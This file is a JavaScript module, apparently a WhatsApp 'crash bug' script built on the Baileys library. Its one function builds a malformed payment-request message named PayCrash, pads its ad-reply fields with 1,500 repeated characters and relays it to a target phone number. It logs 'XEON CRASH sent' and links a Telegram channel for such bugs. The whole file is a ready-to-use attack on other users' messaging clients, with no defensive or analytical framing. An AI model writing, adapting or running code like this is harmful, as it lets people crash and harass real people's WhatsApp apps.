const { jidDecode } = require("@whiskeysockets/baileys");

async function xeoninvisible(sock, target) {
  try {
    // Format target jika belum ada @
    if (!target.includes('@')) target = target + '@s.whatsapp.net';
    
    const PayCrash = {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        requestFrom: target,
        amount1000: 1000, // = 1 IDR
        amount: 1,
        expiryTimestamp: Math.floor(Date.now() / 1000) + 86400,
        contextInfo: {
          externalAdReply: {
            title: "Makloe",
            body: "".repeat(1500),
            mimetype: 'audio/mpeg',
            caption: "G".repeat(1500),
            showAdAttribution: true,
            sourceUrl: "https://t.me/functionbug",
            thumbnailUrl: 'https://files.catbox.moe/2z1knq.jpg'
          }
        }
      }
    };

    // Gunakan sock yang diberikan (bukan Xeonbotinc)
    await sock.relayMessage(target, PayCrash, {
      participant: target,
      messageId: sock.generateMessageTag()
    });

    console.log(`[💀] XEON CRASH sent to ${target}`);
    return { success: true, target: target };
    
  } catch (error) {
    console.error("[🔥] Crash Error:", error);
    throw error;
  }
}

module.exports = { xeoninvisible };
